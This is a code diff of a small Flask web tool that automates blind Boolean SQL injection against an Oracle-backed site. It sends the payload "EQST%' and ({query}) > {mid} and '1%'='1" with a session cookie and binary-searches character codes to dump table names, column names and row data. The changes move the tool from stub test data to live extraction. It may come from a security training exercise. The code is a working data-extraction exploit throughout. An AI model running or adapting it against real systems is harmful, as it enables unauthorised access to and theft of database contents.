@@ -1,8 +1,8 @@
 from flask import Flask, request, render_template, flash, redirect, url_for, session
 from flask_restful import Resource, Api
 import requests
-# from sql_7 import *
 from tools.binarySearch import *
+import asyncio
 
 # pip install Flask-Session
 
@@ -32,8 +32,7 @@ d = {
 
 @app.route("/")
 def index(): 
-    session.pop('jsession', None)
-    set_sessionid("")
+    session.pop('jsessionid', None)
     return render_template("index.html")
 
 
@@ -50,13 +49,17 @@ def submit():
 
 @app.route("/home", methods=['GET'])
 def home():
-    check_set_session()
+    if not "jsessionid" in session:
+        print("no session")
+        flash("세션 id를 입력해야 합니다.")
   
     return redirect("/select")
 
 @app.route("/select", methods=['GET'])
 def select_data():
-    check_set_session()
+    if not "jsessionid" in session:
+        print("no session")
+        flash("세션 id를 입력해야 합니다.")
 
     return render_template("select.html")
 
@@ -67,7 +70,7 @@ def get_table():
 
     # 테스트 데이터
     table_count=6
-    table_name_list=['BOARD','COMM_FILE','COMM_MDI_FILE','MEMBER','ZIPCODE','ANSWER']
+    table_name_list=['ANSWER', 'BOARD', 'COMM_FILE', 'COMM_MDI_FILE', 'MEMBER', 'ZIPCODE']
 
     # table_count = get_table_count()
     # table_name_list = get_table_name(table_count)
@@ -76,7 +79,7 @@ def get_table():
 
 
 @app.route("/column", methods=['GET'])
-def get_column():
+async def get_column():
     check_set_session()
 
     table_name = request.args.get('table_name','none') 
@@ -84,25 +87,30 @@ def get_column():
         return render_template("default_column.html")
 
     # 테스트 데이터
-    column_count = 1
-    column_name_list=['ANSWER']
+    # column_count = 1
+    # column_name_list=['ANSWER']
 
-    # column_count = get_column_count(table_name)
-    # column_name_list = get_coloumn_name(column_count, table_name)
+    column_count = get_column_count(table_name)
+    column_name_list = get_coloumn_name(column_count, table_name)
     
     return render_template("column_page.html",table_name=table_name, column_count=column_count, column_name_list=column_name_list)
 
 @app.route("/data", methods=['GET'])
-def get_data():
+async def get_data():
     check_set_session()
     table_name = request.args.get('table_name','none')
     column_name = request.args.get('column_name','none')
 
-    # data_count = get_data_count(table_name, column_name)
-    data_count=1
-    data_list=['ant6']
-    # data_list = get_data(table_name, column_name, data_count)
-    return render_template("data_page.html", table_nane=table_name, column_name=column_name, data_count=data_count, data_list=data_list)
+    if table_name=='none' or column_name=='none':
+        return render_template("default_data.html")
+
+    data_count = get_data_count(table_name, column_name)
+    data_list = get_data_info(table_name, column_name, data_count)
+
+    # data_count=1
+    # data_list=['ant6']
+    
+    return render_template("data_page.html", table_name=table_name, column_name=column_name, data_count=data_count, data_list=data_list)
 
 
 # ===============================================
@@ -122,14 +130,13 @@ def check_set_session():
         flash("세션 id를 입력해야 합니다.")
     
 
-
-
 def binarySearch(query):
     start = 1
     end  = 127
     while start < end:
         mid = int((start + end) / 2)     
         keyword = f"EQST%' and ({query}) > {mid} and '1%'='1"
+        print(keyword)
         d["keyword"] = keyword  
         print(".")    
         r = requests.post(url=u, headers=h, cookies={"JSESSIONID":session['jsessionid']}, data=d)
@@ -147,10 +154,10 @@ def binarySearch(query):
 # ================================
 
 
-
 # 테이블 개수를 구하는 함수
 def get_table_count():
-    query = f"select count(table_name) from user_tables"
+    # query = f"select count(table_name) from user_tables"
+    query = f"select count(tname) from tab"
     table_count = binarySearch(query)
     print(f"table count is : {table_count}")
     return table_count
@@ -161,17 +168,16 @@ def get_table_name(table_count) :
     table_name_list=[]
 
     print(f"in get_table_name def . . .")
-    # for nth_table in range(1,table_count+1):
-    # 테스트용!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-    for nth_table in range(1,2):
-        get_table_name_length_query = f"select length(table_name) from (select table_name, rownum r from user_tables) where r={nth_table}"
+    for nth_table in range(1,table_count+1):
+        # get_table_name_length_query = f"select length(table_name) from (select table_name, rownum r from user_tables) where r={nth_table}"
+        get_table_name_length_query = f"select length(tname) from (select tname, rownum r from tab) where r={nth_table}"
         nth_table_length = binarySearch(get_table_name_length_query)
 
         table_name=""
-        # for substr in range(1, nth_table_length+1):
+        for substr in range(1, nth_table_length+1):
         # 테스트용!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!1
-        for substr in range(1, 3):
-            get_table_substr_query=f"select ascii(substr( table_name,{substr},1)) from (select table_name, rownum r from user_tables) where r={nth_table}"
+        # for substr in range(1, 3):
+            get_table_substr_query=f"select ascii(substr(tname,{substr},1)) from (select tname, rownum r from tab) where r={nth_table}"
             table_substr = binarySearch(get_table_substr_query)
 
             table_name += chr(table_substr)
@@ -187,9 +193,9 @@ def get_table_name(table_count) :
 
 
 def get_column_count(table_name):
-    query = f"(select count(cname) from col where tname='{table_name}')"
+    query = f"select count(cname) from col where tname='{table_name}'"
     col_count = binarySearch(query)
-    print(f"컬럼 개수 가 {col_count}")
+    print (f"컬럼 개수는 {col_count}")
     return col_count
 
 
@@ -206,8 +212,9 @@ def get_coloumn_name(column_count, table_name) :
         for substr in range(1, col_length+1):
             col_name_query = f"select ascii(substr(cname,{substr},1)) from (select cname, rownum r from col where tname='{table_name}') where r={nth_col}"
             col_name += chr(binarySearch(col_name_query))
+            print(col_name)
         
-        col_name_list.append(table_name)
+        col_name_list.append(col_name)
         # col_name_list[col_name]=None
         print(col_name_list)
 
@@ -219,13 +226,13 @@ def get_coloumn_name(column_count, table_name) :
 # ================================
 
 def get_data_count (table_name, column_name):
-    query = f"(select count({column_name}) from {table_name})"
+    query = f"select count({column_name}) from {table_name}"
     data_count = binarySearch(query)
 
     print(f"데이터의 개수는 {data_count}")
     return data_count
 
-def get_data (table_name, column_name, data_count):
+def get_data_info (table_name, column_name, data_count):
     data_list=[]
     for nth_data in range (1, data_count+1):
     # nth_col번째 컬럼의 이름 길이 구하기
